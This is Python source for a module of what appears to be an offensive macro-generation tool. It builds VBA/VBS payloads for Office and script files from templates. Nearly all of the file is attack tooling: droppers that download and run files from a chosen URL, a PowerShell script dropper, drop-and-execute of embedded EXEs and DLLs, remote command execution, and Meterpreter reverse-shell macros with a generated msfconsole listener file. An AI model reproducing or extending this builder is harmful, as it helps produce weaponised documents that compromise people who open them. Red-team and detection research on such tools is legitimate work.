#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import shlex
import os
import logging
from modules.mp_module import MpModule
import vbLib.Meterpreter
import vbLib.WebMeter
import vbLib.WscriptExec
import vbLib.ExecuteCMDAsync
import vbLib.ExecuteCMDSync
import vbLib.templates
import vbLib.WmiExec
from common.utils import MSTypes, MPParam, getParamValue
from collections import OrderedDict
from common import  utils



class TemplateFactory(MpModule):
    """ Generate a VBA document from a given template """
        
    def _fillGenericTemplate(self, content):
        # open file containing template values       
        cmdFile = self.getCMDFile()
        if os.path.isfile(cmdFile):
            f = open(cmdFile, 'r')
            valuesFileContent = f.read()
            f.close()
            values = shlex.split(valuesFileContent) # split on space but preserve what is between quotes
            for value in values:
                content = content.replace("<<<TEMPLATE>>>", value, 1)
            # remove file containing template values
            os.remove(cmdFile)
            logging.info("   [-] OK!") 
        else:
            logging.warn("   [!] No input value was provided for this template.\n       Use \"-t help\" option for help on templates.")
        
        # Create module
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 


    
    def _processCmdTemplate(self):
        """ cmd execute template builder """
        paramDict = OrderedDict([("Command line",None)]) 
        self.fillInputParams(paramDict)
        self.mpSession.dosCommand =  paramDict["Command line"]     
        
        # add execution functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec )
        self.addVBLib(vbLib.ExecuteCMDAsync )
        
        content = vbLib.templates.CMD
        if self.mpSession.mpType == "Community":
            content = content.replace("<<<CMDLINE>>>", self.mpSession.dosCommand)
        vbaFile = self.addVBAModule(content)
        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 

    
    def _processDropperTemplate(self):
        """ Generate DROPPER  template for VBA and VBS based """
        # Get required parameters
        downloadPathKey = "File name in TEMP or full file path."
        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
        self.fillInputParams(paramDict)

        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec )
        self.addVBLib(vbLib.ExecuteCMDAsync )
        

        content = vbLib.templates.DROPPER
        content = content.replace("<<<URL>>>", paramDict["target_url"])
        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
        # generate random file name
        vbaFile = self.addVBAModule(content)
        
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        logging.info("   [-] OK!")
    
    
    def _processDropper2Template(self):
        """ Generate DROPPER2 template for VBA and VBS based """
        # Get required parameters
        downloadPathKey = "File name in TEMP or full file path."
        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
        self.fillInputParams(paramDict)


        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
            
        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec )
        self.addVBLib(vbLib.ExecuteCMDAsync )

        content = vbLib.templates.DROPPER2
        content = content.replace("<<<URL>>>", paramDict["target_url"])
        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
        # generate random file name
        vbaFile = self.addVBAModule(content)
        
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        logging.info("   [-] OK!")
        
    
    def _processPowershellDropperTemplate(self):
        """ Generate  code based on powershell DROPPER template  """
        # Get required parameters
        paramDict = OrderedDict([("powershell_script_url",None)])      
        self.fillInputParams(paramDict)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec )
        self.addVBLib(vbLib.ExecuteCMDAsync )

        content = vbLib.templates.DROPPER_PS
        content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", paramDict["powershell_script_url"])
        # generate random file name
        vbaFile = self.addVBAModule(content)
        
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        logging.info("   [-] OK!")
    
    
    def _processEmbedExeTemplate(self):
        """ Drop and execute embedded file """
        paramArray = [MPParam("Command line parameters",optional=True)]  
        self.fillInputParams2(paramArray)
        # generate random file name
        fileName = utils.randomAlpha(7)  + os.path.splitext(self.mpSession.embeddedFilePath)[1]
       
        logging.info("   [-] File extraction path: %%temp%%\\%s" % fileName)

        # Add required functions
        self.addVBLib(vbLib.WscriptExec)
        self.addVBLib(vbLib.WmiExec )
        self.addVBLib(vbLib.ExecuteCMDAsync )
        content = vbLib.templates.EMBED_EXE
        content = content.replace("<<<FILE_NAME>>>", fileName)
        if getParamValue(paramArray, "Command line parameters") != "":
            content = content.replace("<<<PARAMETERS>>>"," & \" %s\"" % getParamValue(paramArray, "Command line parameters"))
        else:
            content = content.replace("<<<PARAMETERS>>>","")
        vbaFile = self.addVBAModule(content)
        
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        logging.info("   [-] OK!")
    
    
    def _processDropperDllTemplate(self):
        paramDict = OrderedDict([("URL", None),("Dll_Function",None)])      
        self.fillInputParams(paramDict)  
        dllUrl=paramDict["URL"] 
        dllFct=paramDict["Dll_Function"]   

        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT, MSTypes.XSL]:
            # for VBS based file
            content = vbLib.templates.DROPPER_DLL_VBS
            content = content.replace("<<<DLL_URL>>>", dllUrl)
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            vbaFile = self.addVBAModule(content)
            logging.debug("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
            
        else:
            # generate main module 
            content = vbLib.templates.DROPPER_DLL2
            content = content.replace("<<<DLL_FUNCTION>>>", dllFct)
            invokerModule = self.addVBAModule(content)
            logging.debug("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
            
            # second module
            content = vbLib.templates.DROPPER_DLL1
            content = content.replace("<<<DLL_URL>>>", dllUrl)
            if MSTypes.XL in self.outputFileType:
                msApp = MSTypes.XL
            elif MSTypes.WD in self.outputFileType:
                msApp = MSTypes.WD
            elif MSTypes.PPT in self.outputFileType:
                msApp = "PowerPoint"
            elif MSTypes.VSD in self.outputFileType:
                msApp = "Visio"
            elif MSTypes.MPP in self.outputFileType:
                msApp = "Project"
            else:
                msApp = MSTypes.UNKNOWN
            content = content.replace("<<<APPLICATION>>>", msApp)
            content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
            vbaFile = self.addVBAModule(content)
            logging.debug("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))

        logging.info("   [-] OK!")
    
    
    def _processEmbedDllTemplate(self):
        # open file containing template values       
        paramDict = OrderedDict([("Dll_Function",None)])      
        self.fillInputParams(paramDict)
            
        #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
        if self.outputFileType in [ MSTypes.VBSCRIPTS_FORMATS ]:
            # for VBS based file
            content = vbLib.templates.EMBED_DLL_VBS
            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
            vbaFile = self.addVBAModule(content)
            logging.debug("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
        else:
            # for VBA based files
            # generate main module 
            content = vbLib.templates.DROPPER_DLL2
            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
            invokerModule = self.addVBAModule(content)
            logging.debug("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
            
            # second module
            content = vbLib.templates.EMBED_DLL_VBA
            if MSTypes.XL in self.outputFileType:
                msApp = MSTypes.XL
            elif MSTypes.WD in self.outputFileType:
                msApp = MSTypes.WD
            elif MSTypes.PPT in self.outputFileType:
                msApp = "PowerPoint"
            elif MSTypes.VSD in self.outputFileType:
                msApp = "Visio"
            elif MSTypes.MPP in self.outputFileType:
                msApp = "Project"
            else:
                msApp = MSTypes.UNKNOWN
            content = content.replace("<<<APPLICATION>>>", msApp)
            content = content.replace("<<<MODULE_2>>>", os.path.splitext(os.path.basename(invokerModule))[0])
            vbaFile = self.addVBAModule(content)
            logging.debug("   [-] Second part of Template %s VBA generated in %s" % (self.template, vbaFile))
            
        logging.info("   [-] OK!")
    
    
    def _processMeterpreterTemplate(self):
        """ Generate meterpreter template for VBA and VBS based """
        paramDict = OrderedDict([("rhost",None), ("rport",None) ])      
        self.fillInputParams(paramDict)
         
        content = vbLib.templates.METERPRETER
        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
        content = content.replace("<<<RPORT>>>", paramDict["rport"])
        if self.outputFileType in MSTypes.VBSCRIPTS_FORMATS:
            content = content + vbLib.Meterpreter.VBS
        else:
            content = content + vbLib.Meterpreter.VBA
        vbaFile = self.addVBAModule(content)
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        rc_content = vbLib.templates.METERPRETER_RC
        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
        # Write in RC file
        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "meterpreter.rc")
        f = open(rcFilePath, 'w')
        f.writelines(rc_content)
        f.close()
        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
        logging.info("   [-] OK!")
        
        
 
    def _processWebMeterTemplate(self):
        """ 
        Generate reverse https meterpreter template for VBA and VBS based  
        """
        paramDict = OrderedDict([("rhost",None), ("rport",None) ])
        self.fillInputParams(paramDict)

        content = vbLib.templates.WEBMETER
        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
        content = content.replace("<<<RPORT>>>", paramDict["rport"])
        content = content + vbLib.WebMeter.VBA

        vbaFile = self.addVBAModule(content)
        logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
        
        rc_content = vbLib.templates.WEBMETER_RC
        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
        # Write in RC file
        rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "webmeter.rc")
        f = open(rcFilePath, 'w')
        f.writelines(rc_content)
        f.close()
        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
        logging.info("   [-] OK!")
        
 
    def _generation(self):
        if self.template is None:
            logging.info("   [!] No template defined")
            return False
        if self.template == "HELLO":
            content = vbLib.templates.HELLO
        elif self.template == "DROPPER":
            self._processDropperTemplate()
            return True
        elif self.template == "DROPPER_PS":
            self._processPowershellDropperTemplate()
            return True
        elif self.template == "METERPRETER":
            self._processMeterpreterTemplate()
            return True
        #elif self.template == "WEBMETER":
        #    self._processWebMeterTemplate()
        #    return
        elif self.template == "CMD":
            self._processCmdTemplate()
            return True
        elif self.template == "REMOTE_CMD":
            self.addVBLib(vbLib.ExecuteCMDSync )
            content = vbLib.templates.REMOTE_CMD
        elif self.template == "EMBED_EXE":
            self._processEmbedExeTemplate()
            return True
        elif self.template == "EMBED_DLL":
            self._processEmbedDllTemplate()
            return True
        elif self.template == "DROPPER_DLL":
            self._processDropperDllTemplate()
            return True
        else: # if not one of default template suppose its a custom template
            if os.path.isfile(self.template):
                f = open(self.template, 'r')
                content = f.read()
                f.close()
            else:
                logging.info("   [!] Template %s is not recognized as file or default template. Payload will not work." % self.template)
                return False
         

        self._fillGenericTemplate(content) 
        return True
    
    
    def run(self):
        logging.info(" [+] Generating source code from template...")
        self._generation()
        

